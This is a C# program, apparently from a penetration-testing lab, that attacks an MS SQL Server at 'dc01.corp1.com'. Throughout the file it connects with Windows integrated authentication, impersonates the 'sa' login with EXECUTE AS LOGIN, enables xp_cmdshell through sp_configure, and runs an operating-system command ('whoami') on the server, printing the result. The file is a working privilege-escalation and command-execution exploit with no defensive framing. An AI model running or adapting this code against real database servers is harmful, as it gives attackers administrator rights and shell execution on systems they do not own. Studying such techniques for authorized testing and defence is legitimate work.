using System;
using System.Data.SqlClient;

namespace xp_cmd
{
    class Program
    {
        static void Main(string[] args)
        {
            String server = "dc01.corp1.com";
            String database = "master";
            String conString = "Server = " + server + "; Database = " + database + "; Integrated Security = True;";

            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth Success");
            }
            catch
            {
                Console.WriteLine("Auth Failed");
                Environment.Exit(0);
            }

            String impersonateUser = "EXECUTE AS LOGIN = 'sa'";
            String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE";
            string exec_cmd = "EXEC xp_cmdshell whoami";

            SqlCommand command = new SqlCommand(impersonateUser, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(enable_xpcmd, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(exec_cmd, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Output => " + reader[0]);
            reader.Close();
            con.Close();
        }
    }
}
